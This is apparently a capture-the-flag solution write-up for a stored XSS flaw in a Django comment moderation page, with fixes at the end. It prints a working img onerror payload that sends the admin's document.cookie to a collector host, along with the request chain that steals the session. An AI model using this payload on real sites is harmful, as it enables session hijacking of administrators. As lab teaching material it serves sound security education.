# Solution — Stored XSS in Blog Comment Moderation

## The sink

`comments/templates/moderate.html`:

```django
<div class="body">{{ c.body|safe }}</div>
```

Django autoescapes by default — `{{ c.body }}` alone would render `<img …>` as
inert text. `|safe` marks the value as safe HTML, disabling escaping for the one
field the attacker controls. The comment body is stored verbatim
(`comments/views.py::post_comment`) and rendered on the admin-only moderation
page. Source (public comment) ≠ sink (admin page), attacker ≠ victim — the
defining shape of **stored** XSS (CWE-79, OWASP A03:2021 – Injection).

## Why you can't just open the page

`GET /admin/moderate` requires the admin `session` cookie:

```
GET /admin/moderate              → 403 (you have no admin cookie)
GET /internal/bot-login?k=…      → 403 from the public side (backend-only)
```

You don't need to. The admin bot loads the moderation page every couple of
seconds with its cookie in scope. You plant the payload; it runs in _their_
browser.

## The payload

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

`<img>` in `innerHTML`/raw-rendered HTML fires `onerror` when `src=x` 404s — no
`<script>` needed. Chain:

```
POST /comment     {"author":"guest","body":"<img src=x onerror=\"…document.cookie…\">"}
# admin bot loads /admin/moderate → |safe renders the <img> → onerror fires →
# new Image() beacons document.cookie to the collector
GET  /oob/received       # find /report?c=session%3D<32hex>
POST /solve       {"c":"<32hex>"}     →  FLAG{…}
```

`tests/exploit.py` automates this.

## Why the containment holds

- Postgres and the collector sit on a `backend` network with `internal: true` —
  no route off the host, so the stolen cookie reaches the in-lab collector and
  never the internet.
- `/admin/moderate` and `/internal/bot-login` require the admin session /
  backend origin, so the stored-XSS path is the only way to the admin cookie.
  `risk: low`.

## The fix

1. **Delete `|safe`.** Let Django autoescape:

   ```django
   <div class="body">{{ c.body }}</div>   <!-- <img …> becomes &lt;img …&gt; -->
   ```

   If limited formatting is genuinely needed, run the body through a real HTML
   sanitiser (e.g. `bleach`/`nh3` with an allow-list) before marking it safe —
   never trust raw user HTML.

2. **`HttpOnly` session cookie.** `Set-Cookie: session=…; HttpOnly` makes
   `document.cookie` unable to read it, so even a rendered payload cannot steal
   the session. Fix both — output encoding stops the injection, `HttpOnly` blunts
   its impact.

A strict `Content-Security-Policy` (no inline event handlers) would also have
blocked the `onerror`.
